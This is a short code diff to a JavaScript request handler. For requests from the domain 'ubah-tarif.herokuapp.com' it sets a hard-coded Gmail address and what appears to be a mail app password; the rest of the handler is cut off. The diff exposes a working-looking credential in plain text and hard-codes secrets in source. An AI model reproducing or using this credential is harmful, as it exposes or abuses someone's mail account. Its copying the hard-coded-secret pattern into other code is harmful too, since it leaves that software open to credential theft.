@@ -7,13 +7,14 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
     
-     if (url == ''){
+     if (url == 'ubah-tarif.herokuapp.com'){
 
-       email = ''
-       pass = ''
+        email = 'sitisiti369zx@gmail.com'
+        pass = 'ijihhezjaqsniffg'
+
     } else {
-         email = ''
-         pass = ''
+        email = ''
+        pass = ''
     }
         
         try {
